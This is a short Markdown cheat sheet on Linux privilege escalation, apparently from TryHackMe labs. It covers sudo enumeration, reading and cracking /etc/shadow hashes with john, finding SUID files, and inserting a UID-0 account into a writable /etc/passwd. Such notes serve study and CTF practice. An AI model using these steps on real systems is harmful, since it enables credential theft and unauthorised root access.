# Linux

## Methodology

- Scripts
LinEnum - [Link](https://github.com/rebootuser/LinEnum)
LinpPeas - [Link](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

- sudo -l

Take a look at the variables like **LD_PRELOAD**
Take a look which commands you can run as sudo

```console
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl   
```



## Unshadow Passwd & Shadow

You need to download 2 files. /etc/passwd & /etc/shadow

```console
$ unshadow <passwd> <shadow> > hashes.txt
```

Then crack it with john

```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt new.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (karen)
Password1        (user2)
test123          (gerryconway)
3g 0:00:00:13 DONE (2022-02-19 19:18) 0.2155g/s 1268p/s 1783c/s 1783C/s 111292..ellie123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Cron

ToDo

## Environment var

ToDo

## SUID

Compare executables with [GTFOBins](https://gtfobins.github.io/)

Find SUID files:

```console
$ find / -perm -u=s -type f 2>/dev/null
```

## Writeble files

**/etc/passwd**

Format: `test:x:0:0:root:/root:/bin/bash`

1. Username: It is used when user logs in. It should be between 1 and 32 characters in length.
2. Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".

3. User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. Group ID (GID): The primary group ID (stored in /etc/group file)
5. User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

```console
New entry
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

